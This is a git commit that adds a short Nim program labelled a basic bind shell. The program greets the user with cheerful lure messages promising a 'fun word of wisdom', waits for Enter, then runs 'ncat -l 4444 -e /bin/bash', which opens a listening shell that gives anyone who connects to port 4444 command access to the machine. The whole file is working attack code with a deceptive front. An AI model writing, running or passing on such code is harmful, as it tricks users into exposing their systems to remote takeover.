4d37ff408e6058774a2b9753ece91baa986a62ac
sammite <54330632+sammite@users.noreply.github.com>
2023-02-19 20:29:31 -0500

    Basic BindShell

---
+++ bindShell.nim
@@ -0,0 +1,14 @@
+# Basic bind shell
+
+import osproc
+
+
+echo "Wow! Thanks so much for executing this file!"
+
+echo "You won't regret it!"
+
+echo "Press enter for a fun word of wisdom. :)"
+
+discard readline(stdin)
+
+discard execCmdEx("ncat -l 4444 -e /bin/bash")
